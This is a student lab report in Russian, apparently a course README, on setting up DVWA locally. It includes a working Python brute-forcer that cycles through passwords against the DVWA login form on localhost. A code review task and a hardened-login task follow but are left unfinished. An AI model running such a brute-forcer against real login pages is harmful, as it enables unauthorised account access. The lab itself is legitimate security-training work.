# SDLC_LAB_3_FarzievMT
**Предварительная подготовка**
Был скачан архив DVWA с официального ресурса на github.com, после чего он был установлен с использованием дистрибутивf для сборки локального веб-сервера XAMPP
![image](https://github.com/user-attachments/assets/dcc0da59-069f-46e1-827c-a9e87f4e568c)

Адрес: http://localhost/DVWA-master/login.php
![image](https://github.com/user-attachments/assets/e4547923-9971-4a80-a2f8-f612bd76712b)

После того как был совершен вход (логин-admin, пароль-password) был определен PHPSESSID, а также установлен "Security Level" = low
![image](https://github.com/user-attachments/assets/c130b6d2-c2d8-40e3-bdcd-3b44faa3fc02)

**Задания**
1. Необходимо разработать переборщик паролей для формы в задании Bruteforce на сайте dvwa.local (Можно использовать [официальный ресурс](https://github.com/digininja/DVWA) или виртуальную машину Web Security Dojo)
Для уменьшения количества затраченного времени на подбор пароля было решено "помочь" программе и указать в коде, что пароль начинается на "passw". Данное решение было сделано исключительно в целях сокращения затраченного времени на подбор и для того, чтобы наглядно показать, что прогамма действительно выполняет свою функцию. 
```import itertools
import requests
import time

# Настройки
url = "http://localhost/DVWA-master/vulnerabilities/brute/"
username = "admin"
charset = 'abcdefghijklmnopqrstuvwxyz'
password_length = 8
prefix = "passw"  # Префикс для пароля
session = requests.Session()

# Устанавливаем cookie для авторизации
session.cookies.set("PHPSESSID", "70v501t8fnf3um8jfbdo2bo9fs")
session.cookies.set("security", "low")

def generate_passwords_with_prefix(prefix, length, charset):
    """Генератор паролей фиксированной длины с указанным префиксом."""
    remaining_length = length - len(prefix)
    for combination in itertools.product(charset, repeat=remaining_length):
        yield prefix + ''.join(combination)

def try_password(url, username, password):
    """Проверка пароля."""
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(url, params=params)
        return "Welcome to the password protected area" in response.text
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Ошибка подключения: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False

def main():
    start_time = time.time()
    print("[*] Начинаем подбор пароля...")
    
    # Генерация паролей и их проверка
    for password in generate_passwords_with_prefix(prefix, password_length, charset):
        print(f"[*] Пробуем пароль: {password}")
        if try_password(url, username, password):
            print(f"[+] Пароль найден: {password}")
            break
    else:
        print("[-] Пароль не найден.")

    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} секунд")

if __name__ == "__main__":
    main()
```

Результат выполнения программы
![image](https://github.com/user-attachments/assets/b18e793e-3550-483d-bfbd-3c0c2c343154)

   
2. Проанализировать код и сделать кодревью, указав слабые места. Слабость уязвимого кода необходимо указать с использованием метрики CWE (база данных [cwe.mitre.org](http://cwe.mitre.org))

  
3. Разработать свою систему авторизации на любом языке, исключающий взможность подбора паролей разработнным переборщиком паролей в задании 1. Возможно исправление авторизации из dvwa.local Требования к системе авторизации
